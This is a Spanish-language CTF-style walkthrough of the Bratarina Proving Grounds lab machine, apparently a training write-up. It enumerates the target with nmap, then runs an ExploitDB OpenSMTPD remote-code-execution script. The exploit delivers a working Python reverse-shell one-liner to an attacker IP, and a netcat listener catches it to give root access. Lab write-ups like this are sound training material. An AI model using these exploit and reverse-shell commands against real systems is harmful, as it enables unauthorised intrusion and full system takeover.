---
layout: post
title: Bratarina (Linux - Intermediate) - Proving Grounds Practice
date: 10.06.2025
categories: [Linux, Proving Grounds, Proving Grounds Practice, Walkthrough, OSCP, Tutorial]
tag: [Proving Grounds Practice, Proving Grounds, Linux, Privilege Escalation, OpenSMTPD 2.0.0, OpenSMTPD 6.6.1, SMTP, TCPDump, ExploitDB, RCE, Intermediate]
---

# Resolución paso a paso de la máquina Bratarina:

## ENUMERACIÓN

### NMAP

- Realizamos el primer escaneo para ver que puertos están abiertos:

```bash
nmap -p- --open -v -n 192.168.169.71 -oG allPorts
```

![image.png](assets/img/post-img/Bratarina/image.png)

- Enumeramos los **SERVICIOS ACTIVOS** en los **PUERTOS** que hemos descubierto:

```bash
nmap -sCV -p22,25,80,445 --min-rate 5000 192.168.169.71 -oN targeted
```

 

![image.png](assets/img/post-img/Bratarina/image%201.png)

## EXPLOTACIÓN

- Analizamos varias opciones para encontrar un punto de entrada pero en la **WEB** no encontramos nada, por **SMB** tampoco parece haber nada interesante, intentamos interactuar por **SMTP** a través de **NC** pero tampoco logramos nada importante. Buscamos **EXPLOITS** en base a los **SERVICIOS** y **VERSIONES** y encontramos varias opciones para “**OpenSMTPD**” que, aunque en la máquina víctima se usa la **versión 2.0.0**, todos son de versiones más recientes. Entre los **EXPLOITS** hay una opción escrita en **PYTHON 3** que parece interesante:

### EXPLOITDB

![image.png](assets/img/post-img/Bratarina/image%202.png)

[OpenSMTPD 6.6.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47984)

- Descargamos el **EXPLOIT** y vemos que tenemos que pasarle **3 argumentos**, la **IP** de la máquina víctima, el **PUERTO** de **SMTP (25)** y el comando que queramos ejecutar. Para comprobar si funciona y si podemos recibir conexiones nos ponemos en escucha con **TCPDUMP** y nos enviamos un **PING** hacia nuestra máquina atacante:

```bash
python3 smtpd-script.py 192.168.169.71 25 'ping -c 1 192.168.45.223'
```

![image.png](assets/img/post-img/Bratarina/image%203.png)

```bash
sudo tcpdump -i tun0 icmp
```

![image.png](assets/img/post-img/Bratarina/image%204.png)

- Ahora vamos a intentar lanzarnos la **REVERSE SHELL** para ganar acceso al sistema. Después de muchísimos intentos y de probar con muchas opciones descubrí que con un **NC** básico me llegaba la conexión pero no me permitía interactuar con la **SHELL**, así que seguí buscando hasta que di con una **SHELL** en **PYTHON** que me funcionó (Hay que escapar todas las comillas que se encuentran dentro del **PAYLOAD** con una barra invertida “**\**” para que no entren en conflicto):

[Online - Reverse Shell Generator](https://www.revshells.com/)

![image.png](assets/img/post-img/Bratarina/image%205.png)

```bash
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.223\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
```

- Nos ponemos en escucha, preparamos el **EXPLOIT** y lo lanzamos:

```bash
python3 smtpd-script.py 192.168.169.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.223\",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
```

![image.png](assets/img/post-img/Bratarina/image%206.png)

- Igual que pasa en otras máquinas como por ejemplo **SNOOKUMS**, debemos ponernos en escucha con **NC** por alguno de los **PUERTOS** que la propia máquina víctima tiene abiertos. Si no es así no funcionará y no podremos recibir la conexión.

```bash
nc -lvnp 22
```

![image.png](assets/img/post-img/Bratarina/image%207.png)

- Hemos ganado acceso como **ROOT** directamente, ahora ya podemos leer la **FLAG**:

![image.png](assets/img/post-img/Bratarina/image%208.png)